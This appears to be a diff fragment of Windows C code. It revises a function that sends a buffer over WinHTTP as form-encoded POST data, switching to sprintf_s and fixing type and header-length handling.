@@ -37,7 +37,7 @@ void initConnection()
 	}
 }
 
-void sendData(LPSTR buffer, size_t size)
+void sendData(LPSTR buffer, DWORD size)
 {
 	BOOL err = FALSE;
 	while (TRUE)
@@ -67,10 +67,10 @@ void sendData(LPSTR buffer, size_t size)
 			continue;
 		}
 
-		sprintf(data, "data=%s", buffer);
+		sprintf_s(data, dataSize, "data=%s", buffer);
 
-		LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
-		err = WinHttpSendRequest(hRequest, headers, wcslen(headers), data, dataSize-1, dataSize-1, 0);
+		WCHAR headers[] = L"Content-Type: application/x-www-form-urlencoded\r\n";
+		err = WinHttpSendRequest(hRequest, headers, sizeof(headers)/sizeof(WCHAR)-1, data, dataSize - 1, dataSize - 1, 0);
 		if (err != TRUE)
 		{
 #ifdef DEBUG
